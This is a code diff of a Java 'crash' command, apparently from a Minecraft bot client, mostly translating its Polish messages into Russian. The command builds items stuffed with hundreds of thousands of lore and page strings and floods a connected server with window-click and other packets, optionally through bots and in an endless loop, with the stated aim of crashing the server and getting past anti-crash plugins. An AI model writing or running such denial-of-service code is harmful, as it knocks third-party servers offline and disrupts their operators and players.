@@ -12,46 +12,40 @@ import org.spacehq.mc.protocol.packet.ingame.client.window.ClientCreativeInvento
 import org.spacehq.mc.protocol.packet.ingame.client.window.ClientWindowActionPacket;
 import org.spacehq.opennbt.tag.builtin.*;
 import org.spacehq.packetlib.packet.Packet;
+import ru.crashdami.emortality.Group;
 import ru.crashdami.emortality.objects.Bot;
 import ru.crashdami.emortality.objects.Player;
 import ru.crashdami.emortality.command.Command;
-import ru.crashdami.emortality.enums.CrashType;
-import ru.crashdami.emortality.enums.Group;
+import ru.crashdami.emortality.types.CrashType;
 
 import java.util.ArrayList;
 import java.util.List;
 
 public class CrashCommand extends Command {
 
-    private static CrashCommand instance;
     private ItemStack isBeacon;
     private ItemStack isBook;
     private ItemStack isByte;
     public CrashCommand() {
-        super("crash", "Положите сервер топовым крашером!", ",crash [ilosc pakietow] [boty/PLAYER-true/false] [infinite-true/false] [odstep w sek] &a[&atype&a (swingarm,windowclick,blockplace,setcreativeslot,helditem) [item: beacon/book/byte] ",
-                Group.PLAYER, "krasz", "lag");
-        instance = this;
-        //if (true) {
+        super("crash", "Положи сервер!", ",crash [количество пакетов] [boty/игрок-true/false] [infinite-true/false] [интервал в секундах] &b[&bтип&b (swingarm,windowclick,blockplace,setcreativeslot,helditem) [item: beacon/book/byte] ",
+                Group.USER, "krasz", "lag");
+
         final CompoundTag nbtB = new CompoundTag("display");
         final List<Tag> tagsB = new ArrayList<>();
-        //for (int i = 0; i < 400000; i++)
         for (int i = 0; i < 500000; i++)
-            tagsB.add(new StringTag("-________- jebac xprotector"));
+            tagsB.add(new StringTag("-________- jebac xprotector =3"));
         final ListTag listTagB = new ListTag("Lore", tagsB);
         isBeacon = new ItemStack(137, 64, 0, nbtB);
         isBeacon.getNBT().put(listTagB);
-        // }
 
-        //if (true) {
-        final CompoundTag nbt2 = new CompoundTag("ench");
+        final CompoundTag nbt2 = new CompoundTag(""); //usunieto 'ench'
         final List<Tag> tags2 = new ArrayList<>();
         for (int i = 0; i < 10000; i++)
-            tags2.add(new StringTag("-________- jebac antycrasherki"));
+            tags2.add(new StringTag("-________- jebac антикрашерки =3"));
         final ListTag listTag2 = new ListTag("pages", tags2);
         isBook = new ItemStack(386, 64, 0, nbt2);
         isBook.getNBT().put(listTag2);
-        //}
-        //if (true){
+
         final CompoundTag nbt = new CompoundTag("ench");
         final List<Tag> tags = new ArrayList<>();
         for (int i = 0; i < 20000; i++)
@@ -59,11 +53,6 @@ public class CrashCommand extends Command {
         final ListTag listTag = new ListTag("END", tags);
         isByte = new ItemStack(386, 64, 0, nbt);
         isByte.getNBT().put(listTag);
-        //}
-    }
-
-    public static CrashCommand getInstance() {
-        return instance;
     }
 
     @Override
@@ -72,23 +61,23 @@ public class CrashCommand extends Command {
         //testy
         if (args.length == 2) {
             if (p.getSessionConnect() != null) {
-                p.sendMessage("$p &aWysylam...");
+                p.sendMessage("$p &bWysylam...");
                 final int am = Integer.parseInt(args[1]);
                 for (int i = 0; i < am; i++)
                     p.getSessionConnect().send(new ClientWindowActionPacket(0, 1, 1, isByte,
                             WindowAction.CLICK_ITEM, ClickItemParam.LEFT_CLICK));
             } else {
-                p.sendMessage("$p &cNie jestes polaczony z zadnym serwerem!");
+                p.sendMessage("$p &cВы не подключены ни к одному серверу!");
             }
             return;
         }
 
         if (args.length == 0 || args.length < 7) {
-            p.sendMessage("$p &7Poprawne uzycie: &a" + getUsage());
+            p.sendMessage("$p &7Правильное использование: &b" + getUsage());
             return;
         } else {
             if (!p.isConnected()) {
-                p.sendMessage("$p &cNie jestes polaczony z serwerem!");
+                p.sendMessage("$p &cВы не подключены к серверу!");
                 return;
             }
             final Integer packets = Integer.parseInt(args[1]);
@@ -109,17 +98,17 @@ public class CrashCommand extends Command {
             } else if (args[5].contains("setcreativeslot") || args[5].contains("creativewindowclick")) {
                 crashType = CrashType.SET_CREATIVE_SLOT;
             } else {
-                p.sendMessage("$p &cNieodpowiedni typ crashera. Typy crashera: &7swingarm, windowclick, blockplace, setcreativeslot, helditem");
+                p.sendMessage("$p &cНеправильный тип крашера. Типы крашеров: &7swingarm, windowclick, blockplace, setcreativeslot, helditem");
                 return;
             }
             if (bots) {
                 if (p.getBots().size() < 1) {
-                    p.sendMessage("$p &cNie masz zadnych botow!");
+                    p.sendMessage("$p &cВы еще не запустили не одного бота!");
                     return;
                 }
             }
-            p.sendMessage("$p &7Proba crashowania metoda &a" + crashType.name()
-                    + "&7, &7ilosc pakietow: &a" + args[1] + "&7, sesje: &a" + (bots ? "boty" : "PLAYER"));
+            p.sendMessage("$p &7Метод краш-теста &b" + crashType.name()
+                    + "&7, &7Количество пакетов: &b" + args[1] + "&7, сессии: &b" + (bots ? "boty" : "gracz"));
             if (infinite) {
                 final Thread t = new Thread(() -> {
                     //troche pojebane
@@ -157,11 +146,11 @@ public class CrashCommand extends Command {
                             crashBots(p, packets, packet);
                         } else {
                             if (p.getSessionConnect() == null || !p.isConnected()) {
-                                p.sendMessage("$p &cPrzerywanie crashowania..");
+                                p.sendMessage("$p &cОстановка крашера...");
                                 Thread.currentThread().stop();
                                 return;
                             }
-                            p.sendMessage("$p &aCrashing..");
+                            p.sendMessage("$p &bКраш..");
                             crash(p, packets, packet);
                         }
 
